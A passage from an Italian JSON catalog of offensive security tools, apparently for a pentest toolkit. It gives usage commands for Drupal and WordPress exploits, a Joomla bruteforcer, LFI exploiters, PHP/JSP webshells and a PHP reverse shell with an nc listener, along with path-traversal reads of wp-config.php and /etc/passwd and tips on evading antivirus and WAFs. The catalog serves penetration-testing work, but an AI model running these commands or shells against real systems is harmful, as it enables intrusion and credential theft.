output.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In un <strong>Physical Security Assessment</strong>, permette di dimostrare come un attaccante possa spiare i feed video aziendali senza autenticazione. Durante un <strong>Internal Pentest</strong>, le telecamere sono spesso VLAN-hop points o dispositivi embedded con firmware non patchati che possono essere usati come pivot.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le connessioni RTSP fallite o i tentativi di indovinare il path generano log sugli NVR e sulle telecamere. Il traffico di rete è facilmente identificabile.</p><p><strong>Impatto operativo:</strong> Tentativi eccessivi su dispositivi low-power (vecchie IP camera) possono causare il freeze del servizio video o il riavvio del dispositivo.</p><p><strong>Mitigazioni:</strong> Limitare il numero di thread. Non eseguire screenshot massivi se la banda è limitata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "drupalgeddon",
    "name": "drupalgeddon",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script di exploit per CVE-2014-3704 (SQL Injection) su Drupal 7 che permette Admin Account Takeover e successiva RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Drupalgeddon (v1) è l'exploit per la storica vulnerabilità di SQL Injection pre-auth in Drupal 7. A differenza del suo successore (Drupalgeddon2 che è RCE diretto), questo script sfrutta la manipolazione degli array nei parametri POST per iniettare query SQL arbitrarie. L'obiettivo primario è sovrascrivere le sessioni o creare un nuovo utente amministratore nel database, garantendo il controllo totale del CMS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Admin Creation:</strong> Inietta comandi SQL per inserire un nuovo utente con privilegi 'administrator' nella tabella <code>users</code>.</p><p><strong>Remote Code Execution:</strong> Una volta ottenuto l'accesso amministrativo, lo script può automatizzare l'abilitazione del modulo 'PHP Filter' per eseguire codice PHP arbitrario sul server.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire lo script (spesso ruby o python) contro l'URL del sito Drupal.</p><pre><code># Creazione admin (user: pwned / pass: pwned)\n./drupalgeddon.rb -t https://target.com -u pwned -p pwned\n\n# Reset password admin esistente (distruttivo)\n./drupalgeddon.rb -t https://target.com --reset-admin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Legacy System Assessment:</strong> Utile su vecchie installazioni Drupal 7 interne o abbandonate che non sono state patchate dopo il 2014. Spesso presente in esercizi CTF.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'iniezione SQL lascia tracce evidenti nei log del database e degli errori HTTP. La creazione di utenti admin è un evento ad alta visibilità.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Drupal"
    ],
    "notes": null
  },
  {
    "id": "drupalgeddon2",
    "name": "drupalgeddon2",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dreadlocked/Drupalgeddon2",
    "desc": "Exploit script per CVE-2018-7600 (Drupalgeddon2), vulnerabilità critica RCE su Drupal 7/8 non autenticato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Drupalgeddon2 è uno script di exploit per una delle vulnerabilità più gravi della storia di Drupal. Sfrutta una mancata sanitizzazione nei parametri delle Form API di Drupal (AJAX requests), permettendo a un attaccante remoto non autenticato di iniettare ed eseguire comandi di sistema arbitrari. L'exploit è altamente affidabile e colpisce installazioni default.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Unauthenticated RCE:</strong> Non richiede credenziali. Sfrutta i parametri <code>#post_render</code> o simili per passare comandi PHP/Shell.</p><p><strong>Auto-Detection:</strong> Identifica se il target è vulnerabile prima di lanciare il payload distruttivo, verificando la versione e la risposta alle richieste AJAX manipolate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare lo script Ruby o Python contro l'URL base.</p><pre><code># Verifica e exploit (ottiene shell o esegue comando)\nruby drupalgeddon2.rb https://vulnerable-drupal.com\n\n# Esecuzione comando specifico\npython3 drupal7-cve-2018-7600.py -c \"id\" https://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>External Pentest</strong>, trovare un Drupal non patchato equivale a ottenere accesso al server web. Utile anche in CTF e ambienti legacy. La vulnerabilità è vecchia ma ancora presente in siti abbandonati o intranet.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload sono facilmente firmatbili da IDS/WAF. L'esecuzione lascia log evidenti nelle richieste HTTP POST.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Drupal"
    ],
    "notes": null
  },
  {
    "id": "joomla-bruteforce",
    "name": "joomla-bruteforce",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ajnik/joomla-bruteforce",
    "desc": "Script multi-thread per attacchi a dizionario contro pannelli di login Joomla, con supporto per evasione token CSRF.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo tool è uno specialista nel cracking delle credenziali di amministrazione di Joomla. A differenza dei bruteforcer generici (come Hydra), questo script è consapevole della logica di Joomla: estrae e rinvia automaticamente il \"security token\" (CSRF token) richiesto dal CMS ad ogni tentativo di login, garantendo che i tentativi non vengano scartati silenziosamente dal server.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Token Handling:</strong> Effettua il parsing dell'HTML della pagina di login per trovare il campo hidden randomico e lo include nella richiesta POST successiva.</p><p><strong>Multithreading:</strong> Permette di testare centinaia di combinazioni al secondo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede wordlist utenti e password.</p><pre><code># Attacco standard\npython3 joomla-brute.py -u http://target.com/administrator -w passwords.txt -user admin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web Pentest:</strong> Quando si identifica un Joomla esposto, spesso l'account 'admin' ha password deboli. Questo tool è necessario perché Hydra spesso fallisce contro i token CSRF di Joomla.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera migliaia di log di errore 403/200. Facilmente bloccato da plugin come Akeeba Admin Tools o WAF.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "joomla-dir-traversal",
    "name": "joomla_dir_trav.py",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script Python per sfruttare vulnerabilità di Directory Traversal nel core di Joomla (es. CVE-2019-10945) ed estrarre file di configurazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo script automatizza lo sfruttamento di vulnerabilità di path traversal note nel core di Joomla (come quelle che affliggono versioni da 1.5 a 3.9). La vulnerabilità spesso risiede in componenti come <code>com_media</code> che non filtrano adeguatamente l'input utente nei parametri dei percorsi file. Il tool permette di leggere file sensibili come <code>configuration.php</code> fuori dalla root web.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Config Extraction:</strong> Mira specificamente al file di configurazione di Joomla per estrarre le credenziali del database e le chiavi segrete.</p><p><strong>Evasione Filtri:</strong> Implementa tecniche di bypass comuni per il traversal, come l'uso di encoding URL o path troncati per aggirare controlli di base.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire lo script specificando l'URL base di Joomla.</p><pre><code># Tentativo di lettura configuration.php\npython3 joomla_dir_trav.py --url http://target.com --file ../configuration.php</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Legacy CMS Audit:</strong> Efficace su installazioni Joomla non aggiornate. L'accesso al file di configurazione garantisce quasi sempre l'accesso al database o la possibilità di creare una sessione admin.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Pattern <code>../</code> nell'URL sono altamente sospetti e loggati. I moderni WAF bloccano questi tentativi di default.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "wp-cve-2024-9047",
    "name": "CVE-2024-9047",
    "version": "2024-9047",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Exploit per vulnerabilità critica Path Traversal nel plugin WordPress \"File Upload\" che consente lettura/cancellazione file arbitrari.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CVE-2024-9047 è una vulnerabilità ad alto impatto (CVSS 9.8) che colpisce il plugin \"WordPress File Upload\" (versioni <= 4.24.11). La falla risiede nella mancata sanitizzazione dei percorsi nel file <code>wfu_file_downloader.php</code>, permettendo a un attaccante non autenticato di leggere file sensibili (come <code>wp-config.php</code>) o cancellare file di sistema arbitrari, portando spesso alla compromissione totale del sito tramite estrazione di credenziali database o Denial of Service.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Arbitrary File Read:</strong> Sfrutta sequenze di path traversal (<code>../</code>) per evadere la directory di upload e scaricare file di configurazione critici contenenti salt, chiavi segrete e password database.</p><p><strong>Arbitrary File Deletion:</strong> Oltre alla lettura, l'exploit può essere adattato per cancellare file vitali per il funzionamento del server, causando un crash immediato dell'applicazione web.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare lo script Python contro il target specificando il file da leggere.</p><pre><code># Lettura wp-config.php\npython3 exploit_cve_2024_9047.py -u https://target.com -f /var/www/html/wp-config.php\n\n# Verifica vulnerabilità (check non invasivo)\ncurl -v \"https://target.com/wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=../../../../etc/passwd\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web App Pentest:</strong> Durante l'analisi di siti WordPress, questa CVE offre un vettore di accesso immediato (Initial Access) senza necessità di credenziali. È particolarmente efficace perché il plugin è molto diffuso (oltre 100k installazioni).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste HTTP contenenti <code>../</code> o percorsi assoluti sono facilmente rilevabili dai WAF. I log di accesso mostreranno chiamate anomale a <code>wfu_file_downloader.php</code>.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "wp-wpdiscuz-rce",
    "name": "RCE - wpDiscuz",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://www.exploit-db.com/exploits/49967",
    "desc": "Exploit per vulnerabilità Critical RCE nel plugin wpDiscuz (CVE-2020-24186) tramite upload immagini non sanitizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questa vulnerabilità colpisce il popolare plugin di commenti wpDiscuz (versioni 7.0.0 - 7.0.4). Il plugin permetteva agli utenti di caricare immagini nei commenti, ma controllava solo l'estensione del file e non il contenuto o l'intestazione MIME type in modo sicuro. Un attaccante può caricare un file PHP mascherato (es. con magic bytes GIF) che viene salvato sul server ed eseguibile, portando a Remote Code Execution.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Upload Bypass:</strong> Carica un file con estensione doppia o spoofata che contiene payload PHP, aggirando i controlli lato client/server.</p><p><strong>Execution:</strong> Recupera il path del file caricato dalla risposta AJAX e lo invoca per eseguire la shell.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python o modulo Metasploit.</p><pre><code># Exploit automatico (ottiene shell)\npython3 wpDiscuz_RCE.py -u https://target.com -p /blog-post-url\n\n# Metasploit\nuse exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web Pentest:</strong> Vettore di ingresso molto comune nel 2020/2021. Utile per dimostrare l'importanza di disabilitare l'esecuzione di script nelle directory di upload (hardening).</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Vulnerabilità patchata nelle versioni recenti. Rischio alto di lasciare shell accessibili pubblicamente se non rimossi i file.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "wpxploit-1-0-0",
    "name": "wpxploit",
    "version": "1.0.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/relarizky/wpxploit",
    "desc": "Scanner di vulnerabilità WordPress automatizzato che controlla versioni core, temi e plugin contro database exploit noti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WPXploit è uno strumento di audit per siti WordPress. Simile a WPScan, esegue il fingerprinting dell'installazione per rilevare versioni di plugin e temi, confrontandoli con database di vulnerabilità pubbliche. Mira a fornire una lista rapida di vettori di attacco sfruttabili su installazioni WordPress non mantenute.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione:</strong> Rileva utenti, timthumb, directory listing e backup.</p><p><strong>Exploit Database:</strong> Integra riferimenti a Exploit-DB per i componenti rilevati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python.</p><pre><code># Scansione target\npython3 wpxploit.py --url https://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web Assessment:</strong> Quick check per siti WP.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Meno aggiornato di WPScan, usare come seconda opinione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "wpxstrike",
    "name": "WPXStrike",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/nowak0x01/WPXStrike",
    "desc": "Tool moderno per WordPress Recon e Exploit con focus su enumerazione aggressiva e rilevamento WAF.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WPXStrike combina funzionalità di ricognizione e attacco per WordPress. Oltre alla classica enumerazione di plugin, include moduli per rilevare WAF (Web Application Firewall) e bypassare protezioni semplici. È progettato per essere veloce e fornire report dettagliati sulla superficie d'attacco.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Active Recon:</strong> Bruteforce di path xmlrpc.php e wp-login.php.</p><p><strong>WAF Detection:</strong> Identifica Cloudflare o altri proxy.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>CLI Python.</p><pre><code># Scan completo\npython3 wpxstrike.py -u https://target.com --crawl</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Bug Bounty:</strong> Automazione della fase di discovery su target WP multipli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Traffico di scansione attivo, genera molti 404.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "CMS_Exploits",
      "WordPress"
    ],
    "notes": null
  },
  {
    "id": "phpbash",
    "name": "phpbash",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Arrexel/phpbash",
    "desc": "Webshell PHP con interfaccia terminale simulata nel browser, utile quando non è possibile stabilire connessioni reverse.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PHPBash è una webshell standalone che simula un terminale bash direttamente nel browser. A differenza di una reverse shell che richiede una connessione in uscita verso l'attaccante (spesso bloccata dai firewall), PHPBash funziona interamente sopra HTTP (request/response), permettendo di navigare il file system ed eseguire comandi in modo interattivo e visivo anche in ambienti di rete restrittivi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Firewall Bypass:</strong> Non richiede porte in uscita aperte o connessioni TCP dirette. Tutto il traffico è HTTP standard sulla porta 80/443.</p><p><strong>UI Intuitiva:</strong> Mantiene la directory corrente (cd funziona grazie alla gestione sessione) e mostra l'output colorato, simulando una vera esperienza terminale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Caricare il file <code>phpbash.php</code> sul server e visitarlo.</p><pre><code># Navigazione browser\nhttp://target.com/uploads/phpbash.php</code></pre><p>Si aprirà una pagina web con un prompt nero dove digitare comandi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Restricted Networks:</strong> Quando una reverse shell fallisce perché il server target non può connettersi a Internet o all'IP attaccante. PHPBash fornisce un'alternativa immediata per l'enumerazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I log web mostreranno molte richieste POST verso lo stesso file PHP. Non è persistente e l'accesso è visibile a chiunque conosca l'URL.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "php-reverse-shell",
    "name": "php-reverse-shell",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/pentestmonkey/php-reverse-shell",
    "desc": "La classica reverse shell in PHP di PentestMonkey: file singolo per ottenere accesso remoto da server web vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Lo script PHP Reverse Shell di PentestMonkey è probabilmente il file più caricato nella storia del web pentesting. È uno script PHP autonomo che, quando visitato via browser, apre una connessione TCP in uscita verso l'IP dell'attaccante e vi collega una shell interattiva (<code>/bin/sh</code>). È il payload standard per sfruttare vulnerabilità di File Upload o RCE su stack LAMP.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Robustezza:</strong> Tenta di usare diversi metodi per eseguire comandi (<code>exec</code>, <code>shell_exec</code>, <code>system</code>, <code>passthru</code>) bypassando alcune restrizioni di configurazione PHP.</p><p><strong>Configurabilità:</strong> Basta modificare due variabili all'inizio del file (IP e PORTA) per renderlo pronto all'uso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Modificare il file e caricarlo sul target.</p><pre><code># Modifica variabili\n$ip = '10.10.14.5'; $port = 1234;\n\n# Listener locale (attaccante)\nnc -lvnp 1234\n\n# Trigger (visitando l'URL)\ncurl http://target.com/uploads/shell.php</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Exploitation Web:</strong> Ogni volta che si trova un form di upload non sicuro o una RCE, questo è il payload per trasformare l'accesso web in accesso al sistema operativo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Gli antivirus rilevano questo file staticamente immediatamente. Il traffico di reverse shell in chiaro è rilevabile da IDS.</p><p><strong>Mitigazioni:</strong> Usare versioni offuscate (es. Weevely) o cifrate se l'AV è presente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "tomcat-cmd-jsp",
    "name": "Tomcat_cmd.jsp",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/SecurityRiskAdvisors/cmd.jsp",
    "desc": "Webshell JSP minimalista per Apache Tomcat che fornisce esecuzione comandi via parametro HTTP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>È una classica webshell scritta in Java Server Pages (JSP), progettata per essere caricata su server Tomcat (spesso tramite Manager App o exploit di upload). Una volta deployata, permette di eseguire comandi di sistema sul server ospite passando il comando come parametro nell'URL, restituendo l'output nel browser.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Command Execution:</strong> Usa <code>Runtime.getRuntime().exec()</code> per invocare shell comandi (cmd.exe o /bin/sh).</p><p><strong>Cross-Platform:</strong> Funziona su Tomcat Windows e Linux indistintamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Upload del file .jsp e visita browser.</p><pre><code># Esecuzione comando 'id'\nhttp://target.com/uploads/tomcat_cmd.jsp?cmd=id</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Post-Exploitation Tomcat:</strong> Payload standard quando si trovano credenziali di Tomcat Manager (tomcat:s3cret) per ottenere RCE.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> File .jsp non compilati nelle directory web sono sospetti. Esecuzione di comandi shell genera processi figli di java.exe anomali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "wwwolf-php-webshell",
    "name": "wwwolf-php-webshell",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/WhiteWinterWolf/wwwolf-php-webshell",
    "desc": "Webshell PHP 'WhiteWinterWolf' ottimizzata per stabilità, file upload e bypass restrizioni (open_basedir).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>La webshell di WhiteWinterWolf è progettata per essere leggera ma estremamente affidabile. A differenza di shell complesse che spesso si rompono su configurazioni PHP restrittive, questa shell gestisce intelligentemente i path (Windows/Linux), tenta di resettare <code>open_basedir</code> e offre un'interfaccia pulita per upload file e esecuzione comandi senza JavaScript obbligatorio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Resilienza:</strong> Funziona anche su versioni PHP vecchie. Gestisce output stderr correttamente.</p><p><strong>File Transfer:</strong> Include funzionalità di upload e download file integrate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Upload file .php.</p><pre><code># Accesso via browser\nhttp://target.com/shell.php</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Post-Exploitation Web:</strong> Quando serve una shell stabile per muovere file o compilare exploit locali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> File statico su disco, signature nota. Cancellare dopo l'uso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "lfifreak",
    "name": "LFiFreak",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/OsandaMalith/LFiFreak",
    "desc": "Tool per sfruttamento automatico di vulnerabilità Local File Inclusion (LFI) con supporto per shell reverse e RCE via wrapper PHP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>LFiFreak automatizza il processo spesso noioso di sfruttamento delle vulnerabilità di Local File Inclusion. Invece di testare manualmente decine di payload, il tool scansiona i parametri URL vulnerabili e tenta di trasformare una semplice lettura di file in una Remote Code Execution (RCE) completa, sfruttando wrapper PHP, log poisoning o file upload.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Wrapper Abuse:</strong> Testa automaticamente wrapper come <code>php://filter</code> per leggere sorgenti PHP codificati in base64 (evitando l'esecuzione server-side) o <code>php://input</code> e <code>data://</code> per iniettare codice arbitrario se le configurazioni lo permettono.</p><p><strong>RCE Techniques:</strong> Include tecniche avanzate per ottenere una shell: iniezione nei log di Apache/SSH (Log Poisoning) per poi includerli, o accesso ai file di sessione PHP e al file system virtuale <code>/proc/self/environ</code>.</p><p><strong>Interactive Shell:</strong> Se l'exploit ha successo, fornisce un'interfaccia pseudo-shell per inviare comandi al server vittima come se si fosse in un terminale locale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python 2.7 (legacy). Si avvia specificando l'URL con il parametro vulnerabile.</p><pre><code># Scansione e attacco su parametro 'page'\npython lfifreak.py --url \"http://target.com/index.php?page=FUZZ\"\n\n# Tentativo specifico di RCE via access.log\npython lfifreak.py --url \"http://target.com/vuln.php?file=\" --method logs</code></pre><p>Il tool chiederà interattivamente quali payload testare e mostrerà l'output dei comandi eseguiti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante un <strong>Web Pentest</strong>, quando si individua una potenziale LFI ma i file comuni (<code>/etc/passwd</code>) non portano a nulla di interessante. LFiFreak permette di scalare rapidamente la vulnerabilità per ottenere accesso al sistema operativo sottostante.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload di path traversal (<code>../../etc/passwd</code>) sono signature classiche per qualsiasi WAF/IDS. Il log poisoning lascia tracce permanenti e visibili nei log di sistema del server.</p><p><strong>Impatto operativo:</strong> L'iniezione di codice nei log o nelle sessioni può corrompere file critici, potenzialmente causando DoS del servizio web.</p><p><strong>Mitigazioni:</strong> Usare encoding (URL, Double URL) per offuscare i payload. Verificare manualmente l'esistenza della vuln con payload innocui prima di lanciare l'automazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "lfisuite",
    "name": "LFISuite",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/D35m0nd142/LFISuite",
    "desc": "Scanner e exploiter automatico per vulnerabilità Local File Inclusion (LFI) con 50+ metodi di bypass WAF e shell upload.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>LFISuite automatizza la ricerca e lo sfruttamento di vulnerabilità LFI. Invece di testare manualmente payload come <code>../../etc/passwd</code>, questo tool itera attraverso decine di tecniche di evasione (null byte, encoding, wrapper PHP) per aggirare filtri e WAF. Se possibile, tenta di convertire la LFI in RCE tramite tecniche come <code>/proc/self/environ</code> injection o log poisoning.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WAF Bypass:</strong> Utilizza diverse strategie (path truncation, URL encoding, double encoding) per nascondere il traversamento delle directory.</p><p><strong>Reverse Shell:</strong> Include una modalità automatica per ottenere una shell inversa se rileva che può includere file remoti (RFI) o iniettare codice.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python 2 interattivo.</p><pre><code># Avvio interfaccia\npython2 lfisuite.py\n# Selezionare \"Scanner\" o \"Exploiter\" e inserire URL/Cookie</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web App Pentest:</strong> Quando si sospetta una LFI ma i payload standard falliscono. LFISuite prova esaustivamente le varianti per trovare quella che funziona.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Estremamente rumoroso. Invia centinaia di richieste malevole in pochi secondi. Sicuro trigger per qualsiasi IDS.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "liffy",
    "name": "liffy",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/mzfr/liffy",
    "desc": "Tool moderno per LFI exploitation che sfrutta wrapper PHP (data://, input://, filter://) per data extraction e RCE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Liffy è focalizzato sullo sfruttamento avanzato delle LFI. La sua specialità è l'uso dei wrapper <code>php://filter</code> per estrarre file sorgente codificati in base64 (bypassando l'esecuzione) e <code>data://</code> wrapper per ottenere esecuzione di codice remota immediata. È più mirato e meno rumoroso di LFISuite.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Filter Bypassing:</strong> Automatizza la creazione di catene di filtri PHP per bypassare controlli sui caratteri.</p><p><strong>Interactive Shell:</strong> Se riesce a iniettare codice, fornisce una pseudo-shell comoda per navigare il server.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Python 3 CLI.</p><pre><code># Dump sorgente file index.php\npython3 liffy.py -u http://target.com/index.php?page=FUZZ --data /var/www/html/index.php\n\n# Tentativo RCE\npython3 liffy.py -u http://target.com/vuln.php?page=FUZZ --shell</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>CTF & Code Audit:</strong> Per leggere il codice sorgente di altri file PHP (config.php) e trovare credenziali database hardcoded.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Richiede che <code>allow_url_include</code> sia attivo per alcune tecniche RCE.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "xsstrike-3-1-6",
    "name": "XSStrike",
    "version": "3.1.6",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/s0md3v/XSStrike",
    "desc": "Suite avanzata per rilevamento XSS con analisi del contesto, fuzzing intelligente e generazione payload (non solo regex).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>XSStrike è un salto evolutivo rispetto agli scanner XSS basati su semplici pattern match. Include un motore di analisi del contesto che esamina come l'input viene riflesso nella pagina (dentro un tag, in un attributo, in uno script JS) e genera payload specifici per rompere quel contesto. Include anche un crawler, un fuzzer di parametri e capacità di bypass WAF.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Context Analysis:</strong> Capisce se l'input finisce in <code><input value=\"...\"></code> o <code>var x = '...'</code> e costruisce l'escape corretto.</p><p><strong>Intelligent Fuzzing:</strong> Invece di provare migliaia di payload a caso, ne prova pochi ma mirati e analizza la risposta per vedere se i caratteri pericolosi vengono sanitizzati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Interfaccia CLI Python.</p><pre><code># Scansione URL singolo\npython3 xsstrike.py -u \"https://target.com/search?q=test\"\n\n# Crawling 